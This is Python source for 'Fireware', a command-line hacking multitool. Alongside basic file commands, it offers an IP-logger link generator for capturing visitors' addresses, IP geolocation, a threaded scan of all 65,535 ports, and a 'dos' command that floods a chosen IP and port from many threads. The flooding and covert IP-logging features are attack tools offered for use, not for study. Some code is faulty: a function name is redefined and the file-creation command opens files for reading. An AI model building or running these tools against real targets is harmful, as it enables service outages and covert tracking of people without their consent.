from pycli import *
import requests
import os
import geocoder
import socket
import utils
import concurrent.futures
from fake_useragent import UserAgent
import threading
import shutil
import time

def get_ip() -> None:
    global my_ip
    my_ip = requests.get("https://httpbin.org/ip").json()["origin"]

my_ip = ""
scanned_port = 0
utils.update()
threading.Thread(target=get_ip).start()

prompt_design = colored("\n┌─[", "FF0000")+colored("{}", "FFFFF")+colored("]", "FF0000")+colored("@", "FFA000")+colored("[", "FF0000")+colored("{}")+colored("]", "FF0000")+colored(":~\n", "1A1A1A")+colored("└>", "FF0000")+colored(" $ ", "FFA500")
cli = CLI(prompt=prompt_design, logs=False, user=os.getlogin(), title="Fireware")
cli.clear_host()

@cli.command(alias=["cl"])
def create_link(url: str, port: int) -> None:
    "Create an Iplogger link."
    utils.IPlogger(url, port, my_ip).start()

@cli.command(alias=["glc"])
def geolocate(ip: str) -> None:
    "Geolocate IPv4 adresse or domain name."
    ip = socket.gethostbyname(ip)
    print(f"Localisation: {geocoder.ip(socket.gethostbyname(ip)).city}[{geocoder.ip(socket.gethostbyname(ip)).country}]")

@cli.command(alias=["gip"])
def get_ip(ip: str) -> None:
    "Display the Ipv4 adress of domain name."
    if ip != socket.gethostbyname(ip):
        print(f"Domain: {socket.gethostbyname(ip)}")

@cli.command(alias=["sp"])
def scan_port(ip: str, thread: int = 1024) -> None:
    "Display all ports of an IPV4 adress"
    global scanned_port
    socket.setdefaulttimeout(1)
    opened_port = []
    def scan(ip: str, port: int) -> None:
        global scanned_port
        scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if scanner.connect_ex((ip, port)) == 0:
            opened_port.append(port)
        scanned_port += 1
        pourcent = int((scanned_port/65535) *100)
        pourcent_display = colored("█"*(pourcent // 5), "FF0000")
        unpoucent_display = " "*(20-(pourcent // 5)) 
        print(f"{pourcent_display}{unpoucent_display} {pourcent}/100% {colored(f'{scanned_port}/65535', 'FFFF00')}", end="\r")
        scanner.close()

    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        for port in range(65535):
            executor.submit(scan, ip, port+1)
    print(" "*60, end="\r")
    lip = 0
    for i in opened_port:
        llip = len(f"{ip}:{i}")
        if llip > lip:
            lip = llip
    txt = ""
    for i in opened_port:
        txt += f"{colored('[', 'FF0000')}{colored('+', 'FFFA00')}{colored(']', 'FF0000')}{ip}:{i} {' '*(lip-len(f'{ip}:{i}'))}{utils.port_used(i)}\n"
    echo(txt[:-1])
    scanned_port = 0

@cli.command(alias=["dl"])
def download(ip: str, port: int = 80) -> None:
    "Create an html file from the ip response."
    reponse = requests.request("GET", f"http://{ip}:{port}/", headers={"User-Agent": UserAgent().random})
    if reponse.status_code == 200:
        print(f"{colored('[', 'FF0000')}{colored('Path', 'FFFF00')}{colored(']', 'FF0000')} {os.path.join(CLI.home, 'output', f'{ip}.{port}.html')}")
        if not os.path.exists("output"):
            os.mkdir("output")
        with open(os.path.join("output", f"{ip}.{port}.html"), "wb") as file:
            file.write(reponse.text.encode("utf-8"))
    else:
        print(f"The query returned an error code: {reponse.status_code}")

@cli.command(alias=["ls"])
def dir(path: str = "") -> None:
    "Display all file in directory."
    files = os.listdir(utils.path_format(cli.path, path))
    maxlenght = 0
    for i in files:
        if len(i) > maxlenght:
            maxlenght = len(i)
    echo(f"{'Name'}{(maxlenght-4)*' '} | Last modification   | Perm  | Size")
    echo((39+maxlenght)*"-")
    text = ""
    for i in files:
        file = os.path.join(path, i)
        color = utils.color_file(file)
        data = os.stat(file)
        text += f"{colored(i, color=color)}{(maxlenght-len(i))*' '} | {time.strftime('%S:%M:%H %m:%d:%Y', time.localtime(os.path.getmtime(file)))} | {data.st_mode} | {utils.bytes_convert(data.st_size)}\n"
    echo(text[:-1])

@cli.command(alias=["run"])
def start(path: str) -> None:
    "launch file."
    os.system(os.path.join(cli.path, path))

@cli.command()
def mkdir(path: str) -> None:
    "Create directory."
    os.mkdir(path = utils.path_format(cli.path, path))

@cli.command()
def mkfile(path: str) -> None:
    "Create File."
    with open(utils.path_format(cli.path, path)) as f:
        f.close()

@cli.command(alias=["del"])
def delete(path: str) -> None:
    "Remove file or directory."
    os.remove(path = utils.path_format(cli.path, path))

@cli.command(alias=["cp"])
def copy(path1: str, path2: str) -> None:
    "Copy file."
    path1 = utils.path_format(cli.path, path1)
    path2 = utils.path_format(cli.path, path2)
    shutil.copy(path1, path2)

@cli.command(alias=["mv"])
def move(path1: str, path2: str) -> None:
    "Copy file."
    path1 = utils.path_format(cli.path, path1)
    path2 = utils.path_format(cli.path, path2)
    shutil.copy(path1, path2)
    os.remove(path1)

@cli.command(alias=["rn"])
def rename(path: str, name: str) -> None:
    "Rename file."
    os.rename(utils.path_format(cli.path, path), name)

@cli.command()
def dos(ip: str, port: int, thread: int = 1024, data: int = 1024) -> None:
    "Uses a DOS on the target IP."
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        for i in range(thread):
            executor.submit(utils.send_data, ip, port, data)

@cli.command(alias=["rs"])
def restart() -> None:
    utils.restart()

@cli.command(alias=["vsn"])
def version() -> None:
    print(f"Version: {utils.version()}")

cli.run()